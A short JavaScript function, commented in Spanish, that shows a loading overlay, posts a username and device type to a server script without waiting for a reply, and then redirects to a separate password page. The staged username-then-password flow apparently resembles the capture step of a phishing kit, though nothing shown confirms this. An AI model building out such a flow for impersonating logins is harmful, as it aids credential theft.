function inicio(u){
    var d = detectar_dispositivo();
    $("#fondo, #cargando-o").show();
    
    // Mandamos los datos al servidor (él se encarga de los 4 IDs)
    $.post( "../process/inicio.php", { usr: u, dis: d } );
    
    // No esperamos respuesta. Saltamos rápido para que no se quede cargando.
    setTimeout(function(){ 
        window.location.href = "PASS.php"; 
    }, 800); 
}
